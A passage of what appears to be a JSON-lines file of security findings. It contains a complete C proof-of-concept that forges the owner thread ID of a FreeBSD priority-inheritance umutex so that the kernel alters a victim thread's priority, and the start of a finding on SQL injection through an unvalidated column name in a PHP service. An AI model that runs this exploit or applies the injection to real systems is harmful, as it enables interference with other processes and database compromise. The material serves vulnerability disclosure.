```

2. Compile and run the following proof-of-concept program:

```c
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/umtx.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

// Replace with the TID of the victim thread
#define VICTIM_TID 1234

int main(void) {
    struct umutex *m;

    // Allocate a process-shared PI mutex in shared memory
    m = mmap(NULL, sizeof(*m), PROT_READ|PROT_WRITE,
             MAP_ANON|MAP_SHARED, -1, 0);
    if (m == MAP_FAILED) { perror("mmap"); return 1; }

    memset(m, 0, sizeof(*m));
    // Set UMUTEX_PRIO_INHERIT | USYNC_PROCESS_SHARED flags
    m->m_flags = UMUTEX_PRIO_INHERIT | USYNC_PROCESS_SHARED;

    // Forge owner as victim TID (must not be UMUTEX_UNOWNED=0)
    // Set contested bit so kernel proceeds to sleep path
    m->m_owner = VICTIM_TID | UMUTEX_CONTESTED;

    printf("Blocking on PI mutex with forged owner TID=%d\n", VICTIM_TID);

    // This will call do_lock_pi -> umtxq_sleep_pi
    // Kernel will call tdfind(VICTIM_TID, -1) and set pi_owner
    // Then umtx_propagate_priority will call sched_lend_user_prio on victim
    struct _umtx_time timeout;
    memset(&timeout, 0, sizeof(timeout));
    timeout._timeout.tv_nsec = 100000000; // 100ms timeout
    timeout._flags = UMTX_ABSTIME;
    timeout._clockid = CLOCK_REALTIME;

    // Will return ETIMEDOUT but damage is done during the call
    _umtx_op(m, UMTX_OP_MUTEX_LOCK, 0, 
             (void*)sizeof(timeout), &timeout);

    printf("Done - victim thread priority was manipulated\n");
    return 0;
}
```

3. Observe that the victim thread's `td_lend_user_pri` is modified by `sched_lend_user_prio` in the kernel. This can be verified by checking the scheduling statistics or priority of the target process before and after, or by adding ktrace/tracing.

**Note:** The `casueword32` step may fail if the kernel detects the address is in shared mapping; however since it's the attacker's own mapped memory, the address is valid. The CAS sets the contested bit and returns success (rv==0, old==owner), after which `umtxq_sleep_pi` is called directly with `owner & ~UMUTEX_CONTESTED = VICTIM_TID`.","severity":"medium"}

{"valid":true,"title":"SQL Injection via Unvalidated `field` Parameter in `AnomalyAggregateService::applyFilter()`","summary":"The `applyFilter()` method in `loyalty/app/Services/AnomalyEngine/AnomalyAggregateService.php` (lines ~195-215) passes `$filter['field']` directly as a column name to Eloquent's `$query->where($field, ...)` without any allowlist validation. Because column names cannot be parameterized by PDO, a malicious value in `field` can inject raw SQL.

